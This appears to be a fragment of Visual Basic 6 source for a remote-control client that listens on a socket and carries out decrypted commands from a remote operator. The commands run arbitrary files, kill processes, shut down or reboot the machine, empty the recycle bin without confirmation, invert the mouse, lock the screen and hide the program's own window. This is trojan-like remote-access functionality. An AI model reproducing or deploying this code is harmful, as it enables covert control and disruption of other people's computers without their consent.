    If sStyle = 5 Then
        frmMessageBox.imgRetry.Visible = True
        frmMessageBox.imgCancel.Visible = True
    End If
    If sStyle = 6 Then
        frmMessageBox.imgYes.Visible = True
        frmMessageBox.imgNo.Visible = True
    End If
    If sStyle = 7 Then
        frmMessageBox.imgYes.Visible = True
        frmMessageBox.imgNo.Visible = True
        frmMessageBox.imgCancel.Visible = True
    End If
    If sStyle = 8 Then frmMessageBox.imgOk.Visible = True
    frmMessageBox.Show
    StayOnTop frmMessageBox
    With frmMessageBox
        .Height = 2030
        .Width = 4670
        .Left = (Screen.Width - .Width) / 2
        .Top = (Screen.Height - .Height) / 2
    End With
    Beep
    tmrStatus.Enabled = True
End Sub
Private Sub SendClientEmail(eEmail As String)
    Dim IO As Integer
    IO = InStr(1, eEmail, "|")
    eTo = Mid(eEmail, 1, IO - 1)
    eEmail = Mid(eEmail, IO + 1, Len(eEmail))
    IO = InStr(1, eEmail, "|")
    eSubject = Mid(eEmail, 1, IO - 1)
    eBody = Mid(eEmail, IO + 1, Len(eEmail))
    RemoteEmail = True
    Load frmEmail
End Sub

Private Sub W1_DataArrival(ByVal bytesTotal As Long)
    lblStatus.Caption = " Status:  Receiving Remote Commands..."
    Dim data As String
    W1.GetData data
    data = Decrypt(data, "DataArrival")
    tmrStatus.Enabled = True
    If InStr(1, data, "|EMAIL|") <> 0 Then
        SendClientEmail Mid(data, 8, Len(data))
        Exit Sub
    End If
    If InStr(1, data, "|POPUP|") <> 0 Then
        PopUpMsg Mid(data, 8, Len(data))
        Exit Sub
    End If
    If InStr(1, data, "|TYPING|") <> 0 Then
        frmChat.lblTyping.Visible = True
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|NOTTYPING|") <> 0 Then
        frmChat.lblTyping.Visible = False
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|SLOGIN|") <> 0 Then
        Verify_Login Mid(data, 9, Len(data))
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|EXECUTE|") <> 0 Then
        Execute Mid(data, 10, Len(data))
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|EMPTYRECYCLEBIN|") <> 0 Then
        MakeRecycleBinEmpty "c", True, True, False
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|IE|") <> 0 Then
        OpenIE Mid(data, 5, Len(data))
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|INVERSEMOUSE|") <> 0 Then
        tmrRevMouse.Enabled = True
        lblStatus.Caption = " Status:  Inversing Mouse"
        Exit Sub
    End If
    If InStr(1, data, "|NORMALMOUSE|") <> 0 Then
        tmrRevMouse.Enabled = False
        lblStatus.Caption = " Status:  Normal Mouse"
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|STOPPROCESS|") <> 0 Then
        Dim PR As String
        PR = Mid(data, 14, Len(data))
        StopProcess PR
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|SHUTDOWN|") <> 0 Then
        lblStatus.Caption = " Status:  Shutting Down Windows..."
        ShutDown
        Exit Sub
    End If
    If InStr(1, data, "|REBOOT|") <> 0 Then
        lblStatus.Caption = " Status:  Rebooting Machine..."
        ReBooT
        Exit Sub
    End If
    If InStr(1, data, "|LOGOFF|") <> 0 Then
        lblStatus.Caption = " Status:  Logging Off Local User..."
        LogOff
        Exit Sub
    End If
    If InStr(1, data, "|LOCK|") <> 0 Then
        lblStatus.Caption = " Status:  Locking Screen..."
        lLocked = True
        Load frmLock
        frmLock.Show
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|UNLOCK|") <> 0 Then
        lblStatus.Caption = " Status:  Unlocking Screen..."
        lLocked = False
        Unload frmLock
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|HIDE|") <> 0 Then
        Me.Visible = False
        Exit Sub
    End If
    If InStr(1, data, "|SHOW|") <> 0 Then
        Me.Visible = True
        Exit Sub
    End If
    If InStr(1, data, "|SETTINGS|") <> 0 Then
        lblStatus.Caption = " Status:  Saving New Settings..."
        AdjustSettings Mid(data, 11, Len(data))
        Exit Sub
    End If
    If InStr(1, data, "|CHAT|") <> 0 Then
        lblStatus.Caption = " Status:  Loading Chat..."
        Load frmChat
        frmChat.Show
        DoEvents
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, data, "|CLOSECHAT|") <> 0 Then
        lblStatus.Caption = " Status:  Closing Chat..."
        Unload frmChat
        SockChat.Close
        SockChat.Listen
        tmrStatus.Enabled = True
        Exit Sub
    End If
End Sub
Private Sub StopProcess(Process2Stop As String)
    KillApp (Process2Stop)
End Sub
Private Sub AdjustSettings(sSettings As String)
    Set_Vars sSettings
    sSettings = Encrypt(sSettings)
    Close
    Open App.Path & "\Subnet.ini" For Output As #1
        Print #1, sSettings
    Close
    Load_Info
    tmrStatus.Enabled = True
End Sub
Public Sub MakeRecycleBinEmpty(Optional ByVal Drive As String, Optional NoConfirmation As Boolean, Optional NoProgress As Boolean, Optional NoSound As Boolean)
    Dim hwnd, Flags As Long
    On Error Resume Next
    hwnd = Screen.ActiveForm.hwnd
    If Len(Drive) > 0 Then _
        Drive = Left$(Drive, 1) & ":\"
    Flags = (NoConfirmation And &H1) Or (NoProgress And &H2) Or (NoSound And &H4)
    SHEmptyRecycleBin hwnd, Drive, Flags
End Sub
Private Sub OpenIE(Page As String)
    If LCase(Mid(Page, 1, 4)) <> "http" Then
        ShellExecute Me.hwnd, vbNullString, "http://" & Page, vbNullString, Left$(CurDir$, 3), SW_SHOWNORMAL
    Else
        ShellExecute Me.hwnd, vbNullString, Page, vbNullString, Left$(CurDir$, 3), SW_SHOWNORMAL
    End If
End Sub
Private Sub Execute(Filez As String)
    ShellExecute Me.hwnd, "Open", Filez, "", "", 1
End Sub
